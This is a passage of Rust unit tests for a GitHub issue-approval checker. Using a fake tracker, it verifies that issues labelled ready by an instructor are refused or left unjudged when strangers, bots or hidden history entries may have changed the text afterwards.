        // 99 entries before the label (09:xx) and the newest, an instructor's, after it.
        let times = edit_times(9, 99);
        let mut history: Vec<Edit> = times.iter().map(|t| e(t, "tom")).collect();
        history.push(e(AFTER, "tom"));
        let events = || vec![ready_on(LABELED, "tom")];
        let answer = events_reply(&events(), Some(e(AFTER, "tom")), &history);
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));

        // The same page with the newest edit by a stranger.
        let mut with_stranger: Vec<Edit> = history[..99].to_vec();
        with_stranger.push(e(AFTER, "eve"));
        let refused_answer = events_reply(&events(), Some(e(AFTER, "eve")), &with_stranger);
        assert_eq!(
            approval_of(&refused_answer, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn a_hundred_edits_all_after_the_label_cannot_be_judged() {
        let times = seconds_after_label(100);
        let history: Vec<Edit> = times.iter().map(|t| e(t, "tom")).collect();
        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(&times[99], "tom")),
            &history,
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(history_cut(LABELED))
        );
    }

    #[test]
    fn a_total_above_the_page_is_judged_when_the_oldest_shown_entry_is_before_the_label() {
        let last = Some(e(LATER, "tom"));
        let run = |nodes: &[Edit]| {
            approval_of(
                &approval_reply_raw(&[ready_on(LABELED, "tom")], 1, last, nodes, 150),
                &["tom"],
            )
        };
        assert_eq!(
            run(&[
                e(LATER, "tom"),
                e(AFTER, "tom"),
                e("2026-10-04T09:30:00Z", "tom")
            ]),
            approved(LABELED, "tom")
        );
        // The oldest shown entry must be strictly before the label.
        assert_eq!(
            run(&[e(LATER, "tom"), e(LABELED, "tom")]),
            refused(history_cut(LABELED))
        );
        assert_eq!(
            run(&[e(LATER, "tom"), e(AFTER, "tom")]),
            refused(history_cut(LABELED))
        );
    }

    #[test]
    fn a_cut_page_still_needs_its_newest_entry_to_be_the_last_edit() {
        let times = edit_times(9, 99);
        let mut nodes: Vec<Edit> = vec![e(LATER, "tom")];
        nodes.extend(times.iter().rev().map(|t| e(t, "tom")));
        assert_eq!(nodes.len(), 100);
        let run = |last: Edit| {
            approval_of(
                &approval_reply_raw(&[ready_on(LABELED, "tom")], 1, Some(last), &nodes, 100),
                &["tom"],
            )
        };
        assert_eq!(run(e(LATER, "tom")), approved(LABELED, "tom"));
        // GitHub says the last edit was another one.
        assert_eq!(run(e(AFTER, "tom")), refused(history_cut(LABELED)));
        assert_eq!(run(e(LATER, "amy")), refused(history_cut(LABELED)));
    }

    #[test]
    fn a_label_applied_by_an_actor_that_is_not_a_user_is_refused_whatever_its_login() {
        for typename in [
            "Bot",
            "Organization",
            "Mannequin",
            "EnterpriseUserAccount",
            "",
        ] {
            let mut event = ready_on(LABELED, "tom");
            event["actor"] = json!({"__typename": typename, "login": "tom"});
            let answer = events_reply(&[event], None, &creation_only("eve"));
            assert_eq!(
                approval_of(&answer, &["tom"]),
                refused(by_non_instructor(Some("tom"), LABELED)),
                "{typename}"
            );
        }
    }

    #[test]
    fn an_actor_without_a_typename_is_not_an_instructor() {
        let mut event = ready_on(LABELED, "tom");
        event["actor"] = json!({"login": "tom"});
        let answer = events_reply(&[event], None, &creation_only("eve"));
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(by_non_instructor(Some("tom"), LABELED))
        );
    }

    /// `answer` with the type of the newest history entry's editor replaced.
    fn with_editor_typename(answer: &str, typename: &str) -> String {
        let mut json: Value = serde_json::from_str(answer).unwrap();
        json["data"]["repository"]["issue"]["userContentEdits"]["nodes"][0]["editor"]["__typename"] =
            json!(typename);
        json.to_string()
    }

    #[test]
    fn a_body_edit_or_rename_by_something_that_is_not_a_user_after_the_label_is_refused() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(AFTER, "tom")),
            &[e(CREATED, "eve"), e(AFTER, "tom")],
        );
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));
        for typename in ["Bot", "Mannequin", ""] {
            assert_eq!(
                approval_of(&with_editor_typename(&answer, typename), &["tom"]),
                refused(edited_after(LABELED)),
                "edit by {typename}"
            );
        }

        let mut rename = rename_event(AFTER, "tom");
        rename["actor"] = json!({"__typename": "Bot", "login": "tom"});
        let renamed = events_reply(
            &[ready_on(LABELED, "tom"), rename],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            approval_of(&renamed, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn a_creation_entry_by_something_that_is_not_a_user_before_the_label_is_ignored() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            None,
            &creation_only("dependabot"),
        );
        assert_eq!(
            approval_of(&with_editor_typename(&answer, "Bot"), &["tom"]),
            approved(LABELED, "tom")
        );
    }

    #[test]
    fn approval_for_a_repo_that_is_not_owner_name_makes_no_call() {
        let fake = FakeTracker::new();
        let error = fake.approval("softfac", 6, &names(&["tom"])).unwrap_err();
        assert!(
            matches!(&error, TrackerError::Other(m) if m.contains("returned unexpected output")),
            "{error}"
        );
        assert!(fake.calls().is_empty());
    }

    // ---- text_check ----

    fn text_check_of(answer: &str, since: &str, who: &[&str]) -> TextCheck {
        let fake = FakeTracker::answering([Answer::ok(answer)]);
        let found = fake.text_check(REPO, 6, since, &names(who)).unwrap();
        assert_eq!(fake.calls(), vec![approval_call()]);
        found
    }

    #[test]
    fn text_check_tells_unchanged_from_changed_from_unjudged() {
        // Unchanged: instructors only.
        let instructors = events_reply(
            &[ready_on(LABELED, "tom"), rename_event(AFTER, "tom")],
            Some(e(AFTER, "tom")),
            &[e(CREATED, "eve"), e(AFTER, "tom")],
        );
        assert_eq!(
            text_check_of(&instructors, LABELED, &["tom"]),
            TextCheck::Unchanged
        );
        // Changed: a stranger's rename, a deleted account's edit.
        let renamed = events_reply(
            &[ready_on(LABELED, "tom"), rename_event(AFTER, "eve")],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            text_check_of(&renamed, LABELED, &["tom"]),
            TextCheck::Changed
        );
        let edited = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(AFTER, NOBODY)),
            &[e(CREATED, "eve"), e(AFTER, NOBODY)],
        );
        assert_eq!(
            text_check_of(&edited, LABELED, &["tom"]),
            TextCheck::Changed
        );
    }

    #[test]
    fn text_check_says_unjudged_when_the_histories_cannot_be_read_whole() {
        // A full page of body edits after the label, all by instructors, with more behind it.
        let times = seconds_after_label(100);
        let oldest_first: Vec<Edit> = times.iter().map(|t| e(t, "tom")).collect();
        let last = Some(e(&times[99], "tom"));
        let full = events_reply(&[ready_on(LABELED, "tom")], last, &oldest_first);
        assert_eq!(text_check_of(&full, LABELED, &["tom"]), TextCheck::Unjudged);
        // A stranger shown on that page is still a change: it wins.
        let mut with_stranger = oldest_first.clone();
        with_stranger[50] = e(&times[50], "eve");
        let stranger = events_reply(&[ready_on(LABELED, "tom")], last, &with_stranger);
        assert_eq!(
            text_check_of(&stranger, LABELED, &["tom"]),
            TextCheck::Changed
        );
    }

    #[test]
    fn text_check_ignores_who_applied_labels_but_not_bots() {
        // Labels are not text: a stranger's label event is not a change.
        let labelled = events_reply(
            &[
                ready_on(LABELED, "tom"),
                label_event("LabeledEvent", AFTER, "eve", "bug"),
            ],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            text_check_of(&labelled, LABELED, &["tom"]),
            TextCheck::Unchanged
        );
        // A bot with an instructor's login is not an instructor.
        let rename = rename_event(AFTER, bot("tom"));
        let by_bot = events_reply(
            &[ready_on(LABELED, "tom"), rename],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            text_check_of(&by_bot, LABELED, &["tom"]),
            TextCheck::Changed
        );
    }

    #[test]
    fn text_check_cannot_judge_histories_that_may_hide_something() {
        // A full page of body edits all at or after the moment.
        let times = seconds_after_label(100);
        let history: Vec<Edit> = times.iter().map(|t| e(t, "tom")).collect();
        let edits = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(&times[99], "tom")),
            &history,
        );
        assert_eq!(
            text_check_of(&edits, LABELED, &["tom"]),
            TextCheck::Unjudged
        );

        // A full timeline page whose oldest event is at or after the moment may hide renames.
        let events: Vec<Value> = (0..100).map(|_| rename_event(AFTER, "tom")).collect();
        let full = approval_reply(&events, 150, None, &creation_only("eve"));
        assert_eq!(text_check_of(&full, LABELED, &["tom"]), TextCheck::Unjudged);
        // The same page with its oldest event before the moment shows everything after it.
        let mut reaching = vec![rename_event("2026-10-04T09:00:00Z", "eve")];
        reaching.extend(events.into_iter().skip(1));
        let reaching_answer = approval_reply(&reaching, 150, None, &creation_only("eve"));
        assert_eq!(
            text_check_of(&reaching_answer, LABELED, &["tom"]),
            TextCheck::Unchanged
        );

        // The newest body entry must be the last edit.
        let stale = approval_reply_raw(
            &[ready_on(LABELED, "tom")],
            1,
            Some(e(AFTER, "tom")),
            &[e(CREATED, "eve")],
            1,
        );
        assert_eq!(
            text_check_of(&stale, LABELED, &["tom"]),
            TextCheck::Unjudged
        );
    }

    #[test]
    fn a_cut_off_timeline_page_whose_oldest_event_is_exactly_at_since_cannot_be_judged() {
        // Events before `since` could still be hidden at the same second, so the page must
        // reach strictly before it.
        let page = |oldest: &str| {
            let mut events = vec![rename_event(oldest, "tom")];
            events.extend((0..99).map(|_| rename_event(AFTER, "tom")));
            approval_reply(&events, 150, None, &creation_only("eve"))
        };
        assert_eq!(
            text_check_of(&page(LABELED), LABELED, &["tom"]),
            TextCheck::Unjudged
        );
        assert_eq!(
            text_check_of(&page(AFTER), LABELED, &["tom"]),
            TextCheck::Unjudged
        );
        assert_eq!(
            text_check_of(&page("2026-10-04T09:59:59Z"), LABELED, &["tom"]),
            TextCheck::Unchanged
        );
    }

    #[test]
    fn each_half_of_the_timeline_cut_off_rule_alone_stops_the_judgement() {
        let renames =
            |n: usize| -> Vec<Value> { (0..n).map(|_| rename_event(AFTER, "tom")).collect() };
        // A full page of 100 with nothing more: still a page that may have been cut.
        let full = approval_reply(&renames(100), 100, None, &creation_only("eve"));
        assert_eq!(text_check_of(&full, LABELED, &["tom"]), TextCheck::Unjudged);
        // Fewer than 100 shown with a larger total: something is hidden.
        let short = approval_reply(&renames(99), 120, None, &creation_only("eve"));
        assert_eq!(
            text_check_of(&short, LABELED, &["tom"]),
            TextCheck::Unjudged
        );
        // The control: 99 shown of a total of 99 is the whole timeline.
        let whole = approval_reply(&renames(99), 99, None, &creation_only("eve"));
        assert_eq!(
            text_check_of(&whole, LABELED, &["tom"]),
            TextCheck::Unchanged
        );
    }

    #[test]
    fn text_check_is_changed_for_a_stranger_edit_or_rename_at_or_after_the_moment() {
        let edited = |at: &str, who: Who<'static>| {
            events_reply(
                &[ready_on(LABELED, "tom")],
                Some(e(at, who)),
                &[e(CREATED, "eve"), e(at, who)],
            )
        };
        let renamed = |at: &str, who: Who<'static>| {
            events_reply(
                &[ready_on(LABELED, "tom"), rename_event(at, who)],
                None,
                &creation_only("eve"),
            )
        };
        for at in [LABELED, AFTER] {
            for who in [Who::User("eve"), NOBODY] {
                assert_eq!(
                    text_check_of(&edited(at, who), LABELED, &["tom"]),
                    TextCheck::Changed
                );
                assert_eq!(
                    text_check_of(&renamed(at, who), LABELED, &["tom"]),
                    TextCheck::Changed
                );
            }
        }
        // One second before the moment is before it.
        assert_eq!(
            text_check_of(
                &edited("2026-10-04T09:59:59Z", Who::User("eve")),
                LABELED,
                &["tom"]
            ),
            TextCheck::Unchanged
        );
        assert_eq!(
            text_check_of(
                &renamed("2026-10-04T09:59:59Z", Who::User("eve")),
                LABELED,
                &["tom"]
            ),
            TextCheck::Unchanged
        );
    }

    #[test]
    fn text_check_with_a_timestamp_that_is_not_githubs_form_makes_no_call() {
        for since in ["", "2026-10-04 10:00:00Z", "2026-10-04T10:00:00", "now"] {
            let fake = FakeTracker::new();
            let error = fake
                .text_check(REPO, 6, since, &names(&["tom"]))
                .unwrap_err();
            assert!(
                is_parse_error_of(Some(error), &args(&["api", "graphql"])),
                "{since}"
            );
            assert!(fake.calls().is_empty(), "{since}");
        }
    }

    #[test]
    fn text_check_errors_are_typed() {
        let bad = FakeTracker::answering([Answer::ok("not json")]);
        let parse = bad
            .text_check(REPO, 6, LABELED, &names(&["tom"]))
            .unwrap_err();
        assert!(is_parse_error_of(Some(parse), &approval_call()));

        let failed = FakeTracker::answering([Answer::fail(1, "HTTP 502")]);
        let error = failed
            .text_check(REPO, 6, LABELED, &names(&["tom"]))
            .unwrap_err();
        assert!(
            matches!(&error, TrackerError::Other(m) if m.contains("exited with status 1")),
            "{error}"
        );

        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e("later", "tom")),
            &creation_only("tom"),
        );
        let malformed = FakeTracker::answering([Answer::ok(answer)]);
        let error = malformed
            .text_check(REPO, 6, LABELED, &names(&["tom"]))
            .unwrap_err();
        assert!(is_parse_error_of(Some(error), &approval_call()));
    }

    // ---- text_edited_since ----

    fn edited_since_of(answer: &str, since: &str) -> bool {
        let fake = FakeTracker::answering([Answer::ok(answer)]);
        let found = fake.text_edited_since(REPO, 6, since).unwrap();
        assert_eq!(fake.calls(), vec![approval_call()]);
        found
    }

    #[test]
    fn text_edited_since_is_false_when_nothing_touched_the_text_at_or_after_the_moment() {
        // An edit and a rename before the moment, by anyone, and a label event after it.
        let answer = events_reply(
            &[
                rename_event("2026-10-04T09:00:00Z", "eve"),
                ready_on(LABELED, "tom"),
                label_event("LabeledEvent", AFTER, "eve", "bug"),
            ],
            Some(e("2026-10-04T09:59:59Z", "tom")),
            &[e(CREATED, "eve"), e("2026-10-04T09:59:59Z", "tom")],
        );
        assert!(!edited_since_of(&answer, LABELED));
    }

    #[test]
    fn text_edited_since_is_true_for_any_edit_or_rename_at_or_after_the_moment_even_an_instructors()
    {
        for at in [LABELED, AFTER] {
            let edited = events_reply(
                &[ready_on(LABELED, "tom")],
                Some(e(at, "tom")),
                &[e(CREATED, "eve"), e(at, "tom")],
            );
            assert!(edited_since_of(&edited, LABELED), "edit at {at}");
            let renamed = events_reply(
                &[ready_on(LABELED, "tom"), rename_event(at, "tom")],
                None,
                &creation_only("eve"),
            );
            assert!(edited_since_of(&renamed, LABELED), "rename at {at}");
        }
    }

    #[test]
    fn text_edited_since_is_true_when_the_timeline_may_hide_a_rename() {
        // A full page of newer label events with more behind it: a rename at the moment could
        // be among the hidden ones.
        let events: Vec<Value> = (0..100)
            .map(|i| {
                label_event(
                    "LabeledEvent",
                    &format!("2026-10-04T11:{}:{}Z", pad(i / 60), pad(i % 60)),
                    "eve",
                    "bug",
                )
            })
            .collect();
        let answer = approval_reply(&events, 150, None, &creation_only("eve"));
        assert!(edited_since_of(&answer, LABELED));
    }

    #[test]
    fn text_edited_since_refuses_a_moment_that_is_not_a_github_timestamp() {
        let fake = FakeTracker::new();
        let error = fake.text_edited_since(REPO, 6, "yesterday").unwrap_err();
        assert!(
            matches!(&error, TrackerError::Other(m) if m.contains("returned unexpected output"))
        );
        assert!(fake.calls().is_empty());
    }

    #[test]
    fn approval_sends_one_graphql_call_for_the_issue_and_uses_the_instructors_it_is_given() {
        let answer = json!({"data": {"repository": {"issue": {
            "timelineItems": {
                "totalCount": 1,
                "nodes": [ready_on("2026-10-04T11:36:21Z", "rawphp")],
            },
            "lastEditedAt": null,
            "editor": null,
            "userContentEdits": edits_json(&[e("2026-10-04T09:50:06Z", "outsider")], 1),
        }}}})
        .to_string();
        let fake = FakeTracker::answering([Answer::ok(answer)]);
        let found = fake.approval(REPO, 10, &names(&["rawphp"])).unwrap();
        assert_eq!(found, approved("2026-10-04T11:36:21Z", "rawphp"));
        let calls = fake.calls();
        assert_eq!(calls.len(), 1);
        assert_eq!(calls[0][..2], args(&["api", "graphql"])[..]);
        assert!(calls[0].contains(&"number=10".to_string()));
    }

    /// A recorded answer of the approval query: the label at 10:00 and an outsider's rename at
    /// 10:30.
    const RENAMED_BY_OUTSIDER: &str = r#"{"data":{"repository":{"issue":{"timelineItems":{"totalCount":2,"nodes":[{"__typename":"LabeledEvent","createdAt":"2026-10-04T10:00:00Z","actor":{"__typename":"User","login":"rawphp"},"label":{"name":"factory:ready"}},{"__typename":"RenamedTitleEvent","createdAt":"2026-10-04T10:30:00Z","actor":{"__typename":"User","login":"outsider"}}]},"lastEditedAt":null,"editor":null,"userContentEdits":{"totalCount":1,"nodes":[{"editedAt":"2026-10-04T09:50:06Z","editor":{"__typename":"User","login":"outsider"}}]}}}}}"#;

    #[test]
    fn text_check_sends_one_graphql_call_per_check_and_uses_the_instructors_it_is_given() {
        let fake = FakeTracker::answering([
            Answer::ok(RENAMED_BY_OUTSIDER),
            Answer::ok(RENAMED_BY_OUTSIDER),
            Answer::ok(RENAMED_BY_OUTSIDER),
        ]);
        // The rename is at or after the first moment and before the second.
        assert_eq!(
            fake.text_check(REPO, 10, "2026-10-04T10:00:00Z", &names(&["rawphp"]))
                .unwrap(),
            TextCheck::Changed
        );
        assert_eq!(
            fake.text_check(REPO, 10, "2026-10-04T10:30:01Z", &names(&["rawphp"]))
                .unwrap(),
            TextCheck::Unchanged
        );
        // The list passed is the one used: with the outsider as an instructor it is unchanged.
        assert_eq!(
            fake.text_check(REPO, 10, "2026-10-04T10:00:00Z", &names(&["outsider"]))
                .unwrap(),
            TextCheck::Unchanged
        );
        let calls = fake.calls();
        assert_eq!(calls.len(), 3);
        for call in calls {
            assert_eq!(call.len(), 10);
            assert_eq!(call[..3], args(&["api", "graphql", "-f"])[..]);
            assert!(call[3].starts_with("query=query($owner: String!, $name: String!"));
            assert!(call[3].contains("RENAMED_TITLE_EVENT"));
            assert_eq!(
                call[4..],
                args(&[
                    "-f",
                    "owner=rawphp",
                    "-f",
                    "name=softfac",
                    "-F",
                    "number=10"
                ])[..]
            );
        }
    }

    // ----- End of part B tests -----
}
